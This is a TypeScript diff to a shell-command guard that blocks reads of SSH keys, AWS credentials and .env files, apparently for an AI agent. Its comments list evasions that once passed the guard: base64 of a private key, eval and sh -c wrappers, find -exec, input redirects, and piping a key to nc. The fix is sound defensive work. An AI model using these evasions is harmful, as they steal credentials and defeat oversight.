@@ -460,6 +460,10 @@ export const FS_READ_TOOLS = new Set([
   'od',
   'xxd',
   'hexdump',
+  // Emits the file's bytes, re-encoded, so it is a read by the set's own test
+  // ("does it emit file contents"). Absent until 2026-09-10, which is why
+  // `base64 ~/.ssh/id_rsa` printed a private key with no verdict.
+  'base64',
   'strings',
   'sort',
   'uniq',
@@ -488,12 +492,21 @@ export const FS_READ_TOOLS = new Set([
 // `rm` is joined in because the detector also handles deletion; it is not a
 // reader and deliberately does not live in FS_READ_TOOLS.
 const FS_OP_PRESCREEN_RE = new RegExp(
-  `(?:^|[\\s|;&(\`\\n])(?:rm|${[...FS_READ_TOOLS]
+  // A quote is a separator too: `eval "cat X"` and `sh -c 'cat X'` put the
+  // reader right after `"` / `'`, and without these two characters the
+  // prescreen rejected every string-wrapped read before the parser ran.
+  // Found 2026-09-11 by instrumenting the walk -- no CallExpr was ever visited.
+  `(?:^|[\\s|;&("'\`\\n])(?:rm|${[...FS_READ_TOOLS]
     // Escape defensively: every current name is bare word characters, but a
     // future addition with a `.` or `+` would otherwise become a wildcard and
     // silently widen the prescreen.
     .map((t) => t.replace(/[.*+?^${}()|[\]\\]/g, '\\$&'))
-    .join('|')})\\b`
+    .join('|')})\\b` +
+    // A bare `<` -- an input redirect. Without this alternative `read -r L < X`
+    // and `Y=$(<X)` never reach the parser, because neither contains a reader
+    // word: the exact trap that sank the first copy-verb attempt. `<<` and
+    // `<<<` are excluded; they supply text, not a file.
+    '|(?<!<)<(?!<)'
 );
 
 // Cache directories under $HOME that are tool-managed. Deleting them is safe
@@ -515,6 +528,40 @@ const HOME_CACHE_ALLOWLIST = [
   '.rustup/downloads',
 ];
 
+// ⚠️ Each matcher accepts a separator OR END-OF-STRING after the jail name,
+// but only when a separator is present SOMEWHERE -- `[/\\].ssh(sep|$)` or
+// `^.ssh sep`, never `^…$`.
+//
+// Requiring a TRAILING separator jailed the files inside a credential
+// directory and not the directory itself: measured at the real gate,
+// `grep -r TODO ~/.ssh` and `Grep {path:'~/.ssh'}` were ALLOWED while
+// `cat ~/.ssh/id_rsa` was blocked -- one call read every key.
+//
+// The obvious repair, "separator or end", regressed harder: with `^` already
+// allowed at the front, the bare token `.ssh` matched ITSELF, so
+// `grep -r .ssh ~/project` -- a search for the STRING -- became a hard block.
+// "A search pattern never carries a separator" is ALSO false, measured: the
+// second repair turned `rg /.ssh src/` and `grep -rn config/.ssh .` into hard
+// blocks, both allowed on shipped code. `extractLiteralArgs` discards argument
+// POSITION, so a search pattern and a path are the same token here.
+//
+// What survives measurement: the read worth blocking is ROOTED. A credential
+// directory is reached as `~/.ssh` or `/home/u/.ssh`, never as `config/.ssh`.
+// So "ends at the jail name" fires only after `~`, `/` or a drive letter AND a
+// parent segment; `/.ssh` alone stays allowed. A path with a TRAILING
+// separator keeps the shipped, position-free rule -- a file inside the
+// directory is unambiguous wherever it appears.
+//
+// Cost, stated: `cp -r config/.ssh /tmp`, a RELATIVE copy of a credential
+// directory, stays allowed. The DLP tier does not need any of this -- it is
+// handed an already-RESOLVED path and never sees a search pattern, which is
+// why its list keeps the simpler `([/\\]|$)`.
+//
+// The same bug lived independently in dlp/'s SENSITIVE_PATH_PATTERNS, in
+// project-jail.json's *-any-tool rules, and in pipe-chain.ts's own reader
+// list. FOUR copies of one rule, each with a different escaping dialect and a
+// different input contract. Fixed together here; the split itself is a
+// standing finding, not something this change closes.
 const SENSITIVE_PATH_RULES: Array<{
   rule: string;
   reason: string;
@@ -529,12 +576,12 @@ const SENSITIVE_PATH_RULES: Array<{
   {
     rule: 'shield:project-jail:block-read-ssh',
     reason: 'Reading SSH private keys is blocked by project-jail shield',
-    match: (p) => /(^|[\\/])\.ssh[\\/]/i.test(p),
+    match: (p) => /([\\/]\.ssh[\\/]|^\.ssh[\\/]|^(?:[~/]|[A-Za-z]:).*[\\/]\.ssh$)/i.test(p),
   },
   {
     rule: 'shield:project-jail:block-read-aws',
     reason: 'Reading AWS credentials is blocked by project-jail shield',
-    match: (p) => /(^|[\\/])\.aws[\\/]/i.test(p),
+    match: (p) => /([\\/]\.aws[\\/]|^\.aws[\\/]|^(?:[~/]|[A-Za-z]:).*[\\/]\.aws$)/i.test(p),
   },
   {
     // Mirrors the JSON shield's `.env` pattern (project-jail.json's
@@ -579,7 +626,9 @@ const SENSITIVE_PATH_RULES: Array<{
     //
     // shields.test.ts:983-995 is the canonical contract; keep both in step.
     match: (p) =>
-      /(?:^|[\\/])\.env(?![\w-])(?!\.(?:example|sample|template)\b)(?!\.test$)[\w.-]*$/i.test(p),
+      /(?:^|[\\/])\.env(?![\w-])(?:[\w.-]*\.local$|(?!\.(?:example|sample|template)\b)(?!\.test$)[\w.-]*$)/i.test(
+        p
+      ),
   },
   {
     // verdict: 'review' (not 'block') is a deliberate design choice
@@ -718,7 +767,7 @@ const CHMOD_OPEN_PERM_TOKENS = new Set(['777', '0777', 'a+rwx']);
 // and the AST detector would not — a coverage regression. We look for `chmod`
 // anywhere in a wrapper's args. `echo chmod 777` is NOT affected: `echo` is
 // not a wrapper, so chmod as a non-wrapper argument stays unflagged.
-const COMMAND_WRAPPERS = new Set([
+export const COMMAND_WRAPPERS = new Set([
   'sudo',
   'doas',
   'env',
@@ -955,6 +1004,11 @@ function listOps(): Set<number> {
 // its `-c` takes a command string, so it is an INLINE_INTERPRETER instead.
 const WRAPPER_TAKES_TARGET = new Set(['chroot']);
 
+// `find ... -exec CMD` flags. ONE set: unwrapCommandHead and the jail's find
+// branch both read it, so a flag added here reaches the inline-exec tier and
+// the credential jail together (they had already drifted on `-okdir`).
+const FIND_EXEC_FLAGS = new Set(['-exec', '-execdir', '-ok', '-okdir']);
+
 // Interpreters whose LEADING bare operand names a target rather than a program
 // (`su USER -c CODE`). Their real code flag follows that operand.
 const INTERP_LEADING_TARGET = new Set(['su']);
@@ -963,16 +1017,14 @@ const INTERP_LEADING_TARGET = new Set(['su']);
  *  of the real command head. Handles `sudo -u www python3`, `env -u FOO python3`,
  *  `timeout 5 python3`, `uv run python`, `conda run -n env python`,
  *  `chroot /mnt python3`. */
-function unwrapCommandHead(words: (string | null)[]): number {
+export function unwrapCommandHead(words: (string | null)[]): number {
   let i = 0;
   while (i < words.length) {
     const head = (words[i] ?? '').toLowerCase().split('/').pop() ?? '';
     // `find … -exec CMD …` / `-execdir` run CMD per match — the real command
     // head sits after the flag, and mvdan parses it as ordinary find operands.
     if (head === 'find') {
-      const x = words.findIndex(
-        (w, k) => k > i && (w === '-exec' || w === '-execdir' || w === '-ok')
-      );
+      const x = words.findIndex((w, k) => k > i && w !== null && FIND_EXEC_FLAGS.has(w));
       if (x < 0) break;
       i = x + 1;
       continue;
@@ -1009,7 +1061,12 @@ function unwrapCommandHead(words: (string | null)[]): number {
           !nxt.startsWith('-') &&
           !INLINE_INTERPRETER.test(nxt.split('/').pop() ?? '') &&
           !COMMAND_WRAPPERS.has(nxt.toLowerCase()) &&
-          !RUNNER_WRAPPERS.has(nxt.toLowerCase())
+          !RUNNER_WRAPPERS.has(nxt.toLowerCase()) &&
+          // A reader is a command, never a flag's operand: `env - cat X`,
+          // `stdbuf -o0 cat X`, `ionice -c3 cat X`. Without this the head was
+          // swallowed and the jail needed a looser fallback whose cost was a
+          // false positive on `sudo echo cat X`.
+          !FS_READ_TOOLS.has(nxt.split('/').pop()?.toLowerCase() ?? '')
         )
           i++;
         continue;
@@ -1222,40 +1279,27 @@ export function isProtectedHomePath(rawPath: string): boolean {
  * the resolved string for each arg that is purely literal text.
  */
 // eslint-disable-next-line @typescript-eslint/no-explicit-any
-function extractLiteralArgs(callExpr: any): { name: string; flags: string[]; paths: string[] } {
+function extractLiteralArgs(callExpr: any): {
+  name: string;
+  flags: string[];
+  paths: string[];
+  /** Every arg resolved once (null = dynamic); stage-2 helpers read this. */
+  words: (string | null)[];
+} {
   // eslint-disable-next-line @typescript-eslint/no-explicit-any
   const args: any[] = callExpr.Args || [];
-  if (args.length === 0) return { name: '', flags: [], paths: [] };
-  const litFromWord = (w: unknown): string | null => {
-    // eslint-disable-next-line @typescript-eslint/no-explicit-any
-    const parts: any[] = (w as any)?.Parts || [];
-    let s = '';
-    for (const p of parts) {
-      const t = syntax.NodeType(p);
-      if (t === 'Lit') s += (p.Value ?? '').replace(/\\(.)/g, '$1');
-      else if (t === 'SglQuoted') s += p.Value ?? '';
-      else if (t === 'DblQuoted') {
-        // Only accept pure-literal double-quoted (no expansion)
-        // eslint-disable-next-line @typescript-eslint/no-explicit-any
-        const inner: any[] = p.Parts || [];
-        if (!inner.every((ip: unknown) => syntax.NodeType(ip) === 'Lit')) return null;
-        s += inner.map((ip: { Value?: string }) => ip.Value ?? '').join('');
-      } else {
-        return null; // dynamic — can't resolve safely
-      }
-    }
-    return s;
-  };
-  const name = (litFromWord(args[0]) || '').toLowerCase();
+  if (args.length === 0) return { name: '', flags: [], paths: [], words: [] };
+  const words = args.map((a) => resolveWordLiteral(a));
+  const name = (words[0] ?? '').toLowerCase();
   const flags: string[] = [];
   const paths: string[] = [];
-  for (let i = 1; i < args.length; i++) {
-    const v = litFromWord(args[i]);
+  for (let i = 1; i < words.length; i++) {
+    const v = words[i];
     if (v === null) continue;
     if (v.startsWith('-')) flags.push(v);
     else paths.push(v);
   }
-  return { name, flags, paths };
+  return { name, flags, paths, words };
 }
 
 // ── Network egress destination extraction (GAP-5) ───────────────────────────
@@ -1275,7 +1319,18 @@ export interface ShellDestination {
   raw: string;
 }
 
-const NET_BINARIES = new Set(['curl', 'wget', 'scp', 'ssh', 'nc', 'ncat', 'netcat']);
+// Exported: the orchestrator's isNetworkTool is built from THIS set, so the two
+// lists cannot drift (they had: `rsync` was in the regex and not here).
+export const NET_BINARIES = new Set([
+  'curl',
+  'wget',
+  'scp',
+  'ssh',
+  'nc',
+  'ncat',
+  'netcat',
+  'rsync',
+]);
 
 // Flags whose NEXT token is a value, not a destination. Conservative supersets —
 // missing a rare one only risks a false destination candidate (which is review,
@@ -1706,6 +1761,14 @@ function deriveRedirOp(sample: string): number {
 // content, so `cat >> victim <<E; rm victim` would delete an intact file (same
 // class as touch). Only a `>` truncate counts.
 const REDIR_TRUNCATE_OPS = new Set<number>([deriveRedirOp('>_f')]);
+// Redirects that open a FILE for reading: `<` (RdrIn) and `<>` (RdrInOut).
+// Both hand the file's bytes to whatever consumes stdin -- see
+// jailedRedirectRead. `<<` / `<<-` / `<<<` supply TEXT and are excluded, which
+// is why this is not redirStdinOps(). A failed derivation drops out rather
+// than becoming -1; the spec's `cat <` and `cat <>` rows are the guard.
+const REDIR_FILE_IN_OPS = new Set<number>(
+  [deriveRedirOp('cat < f'), deriveRedirOp('cat <> f')].filter((op) => op >= 0)
+);
 const REDIR_HEREDOC_OPS = new Set<number>([
   deriveRedirOp('cat <<X\nX'),
   deriveRedirOp('cat <<-X\nX'),
@@ -1805,17 +1868,30 @@ export function isRmCreatedInCommandCleanup(command: string): boolean {
   return sawRm && ok;
 }
 
-function analyzeFsOperationImpl(command: string): FsOpVerdict | null {
+function analyzeFsOperationImpl(command: string, depth = 0): FsOpVerdict | null {
   const f = parseShared(command);
   if (f === PARSE_FAIL) return null;
   let result: FsOpVerdict | null = null;
   try {
     syntax.Walk(f, (node: unknown) => {
-      if (!node || result) return false;
+      if (!node || result?.verdict === 'block') return false;
       // eslint-disable-next-line @typescript-eslint/no-explicit-any
       const n = node as any;
-      if (syntax.NodeType(n) !== 'CallExpr') return true;
-      const { name, flags, paths } = extractLiteralArgs(n);
+      const nodeType = syntax.NodeType(n);
+      // A redirect lives on the Stmt, not the CallExpr -- and `$(< X)` is a
+      // Stmt whose Cmd is null, `while ...; done < X` a WhileClause. Judge the
+      // redirect here, for any Cmd, then keep walking into the children.
+      if (nodeType === 'Stmt') {
+        // Keep the STRICTER of what we have and what this redirect says, and do
+        // not stop the walk on a review: `cat KEY < ~/.npmrc` is one statement
+        // whose redirect is a review-tier read and whose argv is a block-tier
+        // one, and stopping here handed back the weaker answer. Two checks on
+        // one input resolve by MAX, never by order.
+        result = stricter(result, jailedRedirectRead(n));
+        return result?.verdict !== 'block';
+      }
+      if (nodeType !== 'CallExpr') return true;
+      const { name, flags, paths, words } = extractLiteralArgs(n);
       if (!name) return true;
 
       // rm with -r and -f (any combination, e.g. -rf, -fr, -r -f)
@@ -1848,20 +1924,29 @@ function analyzeFsOperationImpl(command: string): FsOpVerdict | null {
         }
       }
 
-      // Read tools — `cat ~/.ssh/id_rsa`, etc.
-      if (FS_READ_TOOLS.has(name)) {
-        for (const p of paths) {
-          for (const sp of SENSITIVE_PATH_RULES) {
-            if (sp.match(p)) {
-              result = {
-                ruleName: sp.rule,
-                verdict: sp.verdict ?? 'block',
-                reason: sp.reason,
-                path: p,
-              };
-              return false;
-            }
+      // A string-wrapped command: `sh -c "cat X"`, `eval "cat X"`. The payload
+      // is one literal word; the only honest treatment is to re-parse it, once.
+      // A dynamic payload (ParamExp / CmdSubst) resolves to null and is left to
+      // detectDangerousShellExec + the Class B evalDynamic knob.
+      if (depth < 1) {
+        const payload = literalShellPayload(words, name);
+        if (payload !== null) {
+          const inner = analyzeFsOperationImpl(payload, depth + 1);
+          if (inner) {
+            result = inner;
+            return false;
           }
+          return true;
+        }
+      }
+
+      // Read tools — `cat ~/.ssh/id_rsa`, etc. -- reached directly, through a
+      // wrapper, or as find's -exec action.
+      const readPaths = FS_READ_TOOLS.has(name) ? paths : wrappedReadPaths(words, name);
+      if (readPaths) {
+        for (const p of readPaths) {
+          result = stricter(result, matchSensitivePath(p));
+          if (result?.verdict === 'block') return false;
         }
       }
 
@@ -1871,6 +1956,125 @@ function analyzeFsOperationImpl(command: string): FsOpVerdict | null {
   } catch {
     return null;
   }
+}
+
+// ── Stage 2: reachability ────────────────────────────────────────────────────
+// Before 2026-09-11 the matcher above was consulted only for a path that was a
+// direct argv entry of a reader sitting at argv[0]. Measured at the real gate,
+// controls held, 26 of 31 attack rows were ALLOW: `env cat X`, `cat < X`,
+// `Y=$(<X)`, `eval "cat X"`, `find ~/.ssh -exec cat {} +`. Everything below is
+// a NORMALISATION before the matcher, never a new verdict: `env cat X` gets
+// exactly what `cat X` already gets, so no new false positive can be invented.
+// The one accepted cost is the chmod detector's: a reader NAMED after a wrapper
+// but not run by it (`sudo echo cat X`) blocks. Pinned in
+// policy/jail-reachability.spec.ts. Design: doc/jail-stage2-reachability-design.md.
+
+/** Strictest wins, so no tier can be pre-empted by an earlier weaker one. */
+function stricter(a: FsOpVerdict | null, b: FsOpVerdict | null): FsOpVerdict | null {
+  if (!a) return b;
+  if (!b) return a;
+  return b.verdict === 'block' && a.verdict !== 'block' ? b : a;
+}
+
+/** One matcher for every path slot: argv, wrapper arg, find start point, redirect. */
+function matchSensitivePath(p: string): FsOpVerdict | null {
+  for (const sp of SENSITIVE_PATH_RULES) {
+    if (sp.match(p))
+      return { ruleName: sp.rule, verdict: sp.verdict ?? 'block', reason: sp.reason, path: p };
+  }
+  return null;
+}
+
+// Basenamed, because unwrapCommandHead basenames its head: without it
+// `env /bin/cat KEY` unwrapped to `/bin/cat` and then failed the reader test.
+const isReaderWord = (w: string | null) =>
+  w !== null && FS_READ_TOOLS.has(w.split('/').pop()?.toLowerCase() ?? '');
+const positionalAfter = (words: (string | null)[], from: number, to = words.length) =>
+  words.slice(from, to).filter((w): w is string => w !== null && !w.startsWith('-'));
+
+/**
+ * Non-flag literal words after the reader when the reader is reached through
+ * a wrapper, a runner, `chroot`, or find's -exec action. Null when this
+ * CallExpr is not a wrapped read.
+ *
+ * The rule is unwrapCommandHead, the helper the inline-exec detector already
+ * uses: it knows `sudo -u bob`, `timeout -k 2 5`, `env FOO=1`, `npx`, `uv run`,
+ * `conda run -n e`, `chroot /mnt`. A first cut added a looser fallback ("first
+ * reader word anywhere after the wrapper") to reach `env - cat` / `stdbuf -o0
+ * cat`, at the cost of blocking `sudo echo cat X`. Teaching the helper that a
+ * READER is never a flag's operand reaches the same rows with no such cost --
+ * and keeps this tier and pipe-chain, which calls the same helper, in step.
+ *
+ * find is an iterator: the jailed path is ITS argument and the reader follows
+ * -exec, so the paths are the start points BEFORE the flag. Only a reader after
+ * -exec counts; `-exec cp` is the copy-verb question (stage 4).
+ */
+function wrappedReadPaths(words: (string | null)[], name: string): string[] | null {
+  if (name === 'find') {
+    const k = words.findIndex((w) => w !== null && FIND_EXEC_FLAGS.has(w));
+    if (k < 1 || !isReaderWord(words[k + 1] ?? null)) return null;
+    // find's grammar is `find <start points> <predicates> -exec ...`, so the
+    // start points end at the FIRST predicate. Taking every non-flag word
+    // before -exec swallowed PREDICATE OPERANDS, and an EXCLUSION then read as
+    // a read: `find src -not -path '*/.ssh/*' -exec grep -l TODO {} +` became a
+    // hard block on a command whose whole point is avoiding the jailed files
+    // (/code-review 2026-09-11).
+    const firstPredicate = words.findIndex((w, i) => i > 0 && w !== null && w.startsWith('-'));
+    return positionalAfter(words, 1, firstPredicate > 0 ? firstPredicate : k);
+  }
+  if (!COMMAND_WRAPPERS.has(name) && !RUNNER_WRAPPERS.has(name)) return null;
+  const h = unwrapCommandHead(words);
+  return h > 0 && isReaderWord(words[h] ?? null) ? positionalAfter(words, h + 1) : null;
+}
+
+/**
+ * The literal command string carried by `eval …` or `<interp> -c "…"`, or null
+ * when there is none or it is dynamic. eval concatenates its arguments, so
+ * `eval cat X` and `eval "cat X"` both yield `cat X`. Only an exact `-c` is
+ * honoured; a combined `-lc` is a pinned non-goal.
+ */
+function literalShellPayload(words: (string | null)[], name: string): string | null {
+  // `sudo sh -c "cat KEY"` is the commonest privileged idiom there is, and the
+  // wrapper hid it: this ran on argv[0] only. Unwrap first, then read the
+  // interpreter from the head. (Measured 2026-09-11: `sudo sh -c`, `env sh -c`
+  // and `timeout 5 bash -c` on a jailed key were all ALLOW.)
+  const h = COMMAND_WRAPPERS.has(name) || RUNNER_WRAPPERS.has(name) ? unwrapCommandHead(words) : 0;
+  const head = (words[h] ?? '').split('/').pop()?.toLowerCase() ?? '';
+  if (head === 'eval') {
+    const rest = words.slice(h + 1);
+    if (rest.length === 0 || rest.some((w) => w === null)) return null;
+    return (rest as string[]).join(' ');
+  }
+  if (SHELL_INTERPRETERS.has(head)) {
+    // isInlineCodeFlag, not `w === '-c'`: the engine already decodes bundles
+    // (`bash -lc`, `sh -xc`) and `--command` for the inline-exec tier, and two
+    // answers to "which flag carries the code" would drift.
+    const c = words.findIndex((w, i) => i > h && w !== null && isInlineCodeFlag(head, w));
+    if (c < 0) return null;
+    return words[c + 1] ?? null;
+  }
+  return null;
+}
+
+/**
+ * A jailed file on the input side of a redirect. Verb-agnostic on purpose:
+ * `cmd < jailed` feeds the file's bytes to cmd's stdin, which is a read of the
+ * file whatever cmd is (founder decision, 2026-09-11) -- `nc h 80 < key` is
+ * exfiltration, `read L < key` is a read, `tee /tmp/x < key` is a copy. Only
+ * RdrIn counts: `<<` and `<<<` supply text, not a file.
+ */
+// eslint-disable-next-line @typescript-eslint/no-explicit-any
+function jailedRedirectRead(stmt: any): FsOpVerdict | null {
+  // eslint-disable-next-line @typescript-eslint/no-explicit-any
+  const redirs: any[] = stmt.Redirs || [];
+  for (const r of redirs) {
+    if (!r || !REDIR_FILE_IN_OPS.has(r.Op)) continue;
+    const p = resolveWordLiteral(r.Word);
+    if (p === null || p === '') continue; // dynamic operand: unknowable, skip
+    const hit = matchSensitivePath(p);
+    if (hit) return hit;
+  }
+  return null;
 }
 
 export interface ShellCommandAnalysis {
